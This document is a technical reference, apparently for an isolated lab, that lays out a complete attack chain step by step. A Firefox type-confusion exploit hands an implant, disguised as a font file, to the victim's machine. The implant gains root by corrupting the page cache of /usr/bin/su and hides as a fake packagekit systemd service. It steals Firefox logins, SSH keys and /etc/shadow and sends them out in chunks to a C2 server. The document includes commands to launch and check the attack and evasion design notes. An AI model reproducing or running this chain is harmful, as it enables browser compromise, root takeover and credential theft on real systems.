# Technical Reference — Exploit Chain & Implant Behavior

## Architecture

```
User visits guide.html (Firefox)
  │
  ├─► CVE-2022-1802 + CVE-2022-1529 + CVE-2022-2200 type confusion exploit
  │   Installs OOB read/write primitives, patches System Principal,
  │   obtains ChromeUtils / Components / Services in the page context.
  │
  ├─► Components.utils.Sandbox(systemPrincipal)
  │   Creates a chrome-privileged sandbox.
  │
  └─► evalInSandbox(payload): true chrome context execution
        NetUtil fetches /fonts/NotoSans-Bold.woff2 (the implant binary)
        → ctypes → memfd_create(MFD_CLOEXEC) → write → fork → setsid →
        execl(/proc/self/fd/N) → implant executes as ubuntu user
        │
        ├─► marker::write("init")               # forensic marker (if enabled)
        ├─► Double fork — detaches from Firefox
        ├─► Read /proc/self/exe → static-musl ELF binary
        ├─► memfd_create → write self → dup2 to fd 9
        │
        ├─► CopyFail (CVE-2026-31431)
        │   AF_ALG socket + splice → corrupts /usr/bin/su page cache
        │   → execl("/usr/bin/su") → shellcode runs as root
        │
        └─► Shellcode (root, fd 9 = binary):
              setuid(0) → execve("/proc/self/fd/9")
              │
              └─► Root implant executes:
                    ├─► Drop self to /usr/lib/packagekit/packagekitd
                    ├─► Install systemd service: packagekit-backend.service
                    │     ExecStart=/usr/lib/packagekit/packagekitd
                    │     Environment=POLKIT_DAEMON=1
                    │     Restart=always, RestartSec=600s
                    ├─► systemctl enable + start packagekit-backend
                    ├─► Harvest: Firefox logins.json + key4.db
                    │             .ssh/id_*, .bash_history, /etc/shadow
                    ├─► Recon: /proc/net/{arp,tcp,tcp6,udp,fib_trie}
                    │           /sys/class/net/*, hostname
                    ├─► Exfil: in-memory tar + gzip (miniz_oxide)
                    │           4KB chunks → TLS/TCP to C2 server
                    │
                    └─► Beacon (via systemd Restart=always):
                          ENV POLKIT_DAEMON=1 detected → run_beacon()
                          → connect C2 → send {"host":"...","ts":...} → exit
                          → restarted after RestartSec (default 600s)
```

## Key Design Decisions

- **fd 9 anchor**: Shellcode uses `dup2(fd, 9)` before CopyFail. Regardless of how many file descriptors Firefox had open, the implant binary is always at fd 9. No runtime patching, no fd number collisions.
- **Systemd persistence**: No `.so`/`ld.so.preload` — avoids disk-forensic "file too short" errors and memfd re-exec complexity. The systemd service is simpler and blends with legitimate services.
- **No CLI flags**: Beacon mode detected via `POLKIT_DAEMON=1` environment variable (set by systemd service). Invisible in `/proc/cmdline` or `ps aux`.
- **Process masquerade**: `[kworker/0:2]` during escalation phase, `[packagekitd]` during beacon phase. Both blend with kernel worker threads.
- **In-memory gzip**: miniz_oxide for compression — no forking of `/bin/tar` or `/bin/gzip` (visible in sysdig/eBPF logs).
- **Compile-time config**: `option_env!()` bakes C2 address into binary. Survives `execve` with empty environment.
- **TLS by default**: rustls (pure Rust, no system OpenSSL dependency) for static musl compatibility. Accepts any certificate (C2 uses self-signed certs).

## Full Exploit Chain Detail

### Stage 1 — Firefox Code Execution

1. User visits `guide.html`.
2. `chunk-1.mjs` + `chunk-2.mjs` trigger a type confusion bug (CVE-2022-1802/1529/2200).
3. `vendor.js` installs OOB read/write primitives using corrupted ArrayBuffer views.
4. `vendor.js` locates `libxul_base` via heap scanning, then finds `gSystemPrincipal`.
5. The System Principal's `JSPrincipals*` and `isSystem` flag are patched to grant chrome privileges.
6. A sandboxed `about:config` iframe provides `ChromeUtils` and `Services` in the page context.

### Stage 2 — Payload Delivery (JavaScript)

7. A `Components.utils.Sandbox` is created with the patched System Principal.
8. `ChromeUtils` is injected into the sandbox (not auto-available).
9. `evalInSandbox` executes the payload:
   - `NetUtil.newChannel` fetches `/fonts/NotoSans-Bold.woff2` with `loadUsingSystemPrincipal: true`.
   - `nsIBinaryInputStream.readBytes` reads the raw bytes.
   - `ctypes.open("libc.so.6")` declares: `memfd_create`, `write`, `fork`, `setsid`, `execl`, `_exit`, `close`.
   - `memfd_create("", MFD_CLOEXEC)` creates an anonymous in-memory file.
   - Binary data is written to the memfd.
   - `fork()` → child calls `setsid()` → `execl("/proc/self/fd/N")`.
   - The implant binary now executes as the `ubuntu` user.

### Stage 3 — Privilege Escalation (CopyFail)

10. Implant masquerades as `[kworker/0:2]` via `prctl(PR_SET_NAME)`.
11. Double fork detaches from Firefox — grandchild is orphaned to PID 1.
12. `/proc/self/exe` is read to obtain the full binary.
13. A new memfd is created, the binary is written, `lseek` to 0.
14. `dup2(memfd, 9)` locks the binary to fd 9. CLOEXEC is removed from fd 9.
15. `CopyFail::escalate()` is called:
    - An `AF_ALG` socket is created with `algif_aead` ("authenc(hmac(sha1),cbc(aes))").
    - A page-aligned 4096-byte buffer is allocated.
    - `read()` from the AF_ALG socket → kernel crypto material.
    - `pipe()` + `splice()`: copies crypto output from pipe to `/usr/bin/su` at offset 0.
    - Writes the shellcode ELF 4 bytes at a time via splice into su's page cache.
    - `execl("/usr/bin/su")`: kernel loads the corrupted page cache version.
16. Since `/usr/bin/su` is setuid root, the shellcode runs with euid=0.

### Stage 4 — Shellcode (Root, ~175 bytes)

17. `setuid(0)` + `setgid(0)`: permanent root credentials.
18. `execve("/proc/self/fd/9")`: re-executes the implant from fd 9.
19. The implant now runs as root in `run_as_root()`.

### Stage 5 — Root Implant

20. Process masquerade: `[kworker/0:2]`.
21. **Persistence**:
    - Reads `/proc/self/exe` → writes to `/usr/lib/packagekit/packagekitd`.
    - Creates `/etc/systemd/system/packagekit-backend.service` with:
      ```
      ExecStart=/usr/lib/packagekit/packagekitd
      Environment=POLKIT_DAEMON=1
      Restart=always
      RestartSec=600s
      ```
    - `systemctl daemon-reload` → `enable` → `start`.
22. **Credential harvesting**:
    - Firefox: `logins.json` + `key4.db` from `~/.mozilla/firefox/*.default-release/`.
    - SSH: `~/.ssh/id_rsa`, `id_ed25519`, `id_ecdsa`, `id_dsa`.
    - Bash history: `~/.bash_history`.
    - Root-level: `/etc/shadow`.
23. **Network reconnaissance** (passive, no network activity):
    - `/proc/net/arp` — ARP table.
    - `/proc/net/tcp`, `/proc/net/tcp6` — TCP connections.
    - `/proc/net/udp` — UDP listeners.
    - `/proc/net/fib_trie` — routing table.
    - `/sys/class/net/*/address` — MAC addresses.
    - `hostname` from `/proc/sys/kernel/hostname`.
24. **Exfiltration**:
    - POSIX ustar tar headers constructed in memory.
    - gzip compressed via flate2/miniz_oxide.
    - Split into 4KB chunks.
    - Each chunk sent via TLS (rustls) or TCP to the C2 server.
    - Configurable pauses between chunks.
25. **Exit**: `exit(0)`.

### Stage 6 — Beacon (Systemd)

26. Systemd starts `packagekit-backend.service` → exec's `/usr/lib/packagekit/packagekitd` with `POLKIT_DAEMON=1`.
27. Process masquerade: `[packagekitd]`.
28. `main()` detects `POLKIT_DAEMON` env var → calls `run_beacon()`.
29. Connects to C2 via TLS/TCP, sends `{"host":"<hostname>","ts":<unix_time>}`, exits.
30. Systemd restarts after `RestartSec` (default 600s). Cycle repeats.

## Target Artifacts

After a successful attack, the following artifacts exist on the target:

1. `/usr/lib/packagekit/packagekitd` — root-owned executable (binary copy of the implant).
2. `/etc/systemd/system/packagekit-backend.service` — systemd unit file.
3. `/dev/shm/deepcode_marker.*` — forensic traces (only if `LABELLING_MARKER=1` at build time).
4. `/usr/bin/su` — hash permanently changed due to page cache corruption flushed to disk.

The `packagekit-backend` service is enabled and active, running the beacon at the configured interval.

## Lab Environment

### Target VM

```
Name:       target-clean
Project:    garonne
Image:      Ubuntu 22.04 desktop, Firefox 97.0.1
ASLR:       0 (off — /proc/sys/kernel/randomize_va_space = 0)
Sandbox:    Off (MOZ_DISABLE_CONTENT_SANDBOX=1 in /etc/environment)
Shell:      bash
su:         55672 bytes, hash 1d0c252e639c0846abe2d46ef7ea5d44, PIE (ET_DYN)
Kernel:     6.8.0-117-generic
```

### Attacker Container (incus)

```
Name:       attacker-expert
Project:    garonne
IP:         10.170.22.201
Mount:      ./serve → /mnt/serve

Services:
  Port 443  — web_server.py (HTTPS exploit delivery)
  Port 8443 — c2_server.py    (Raw-TLS C2 listener)
```

## Quick Start (incus lab)

```bash
# Restore clean VM state
incus stop target-clean --project garonne
incus snapshot restore target-clean clean --project garonne
incus start target-clean --project garonne

# Wait for VM agent
until incus exec target-clean --project garonne -- hostname; do sleep 2; done

# Start HTTPS web server + C2 listener on attacker
incus exec attacker-expert --project garonne -- bash -c '
  cd /mnt/serve && python3 web_server.py --port 443 &
  cd /mnt/serve && python3 c2_server.py --port 8443 &
'

# On target VM GUI:
# Open Firefox, visit http://10.170.22.201/guide.html

# Check results (~30s after page load):
incus exec target-clean --project garonne -- ls -la /usr/lib/packagekit/packagekitd
incus exec target-clean --project garonne -- systemctl status packagekit-backend
incus exec attacker-expert --project garonne -- cat /mnt/serve/c2_beacons.log
incus exec attacker-expert --project garonne -- wc -c /mnt/serve/c2_loot.bin
```

### Testing the implant directly (bypasses Firefox)

```bash
incus file push \
  payloads/implant-rust/target/x86_64-unknown-linux-musl/release/implant \
  target-clean/tmp/t3implant --project garonne
incus exec target-clean --project garonne -- chmod +x /tmp/t3implant
incus exec target-clean --project garonne -- runuser -u ubuntu /tmp/t3implant
```

### Cleanup

```bash
# Manual cleanup:
incus exec target-clean --project garonne -- bash -c '
  systemctl stop packagekit-backend 2>/dev/null
  systemctl disable packagekit-backend 2>/dev/null
  rm -f /etc/systemd/system/packagekit-backend.service
  rm -f /usr/lib/packagekit/packagekitd
  rm -f /dev/shm/deepcode_marker.*
'

# Or restore clean snapshot:
incus snapshot restore target-clean clean --project garonne
```
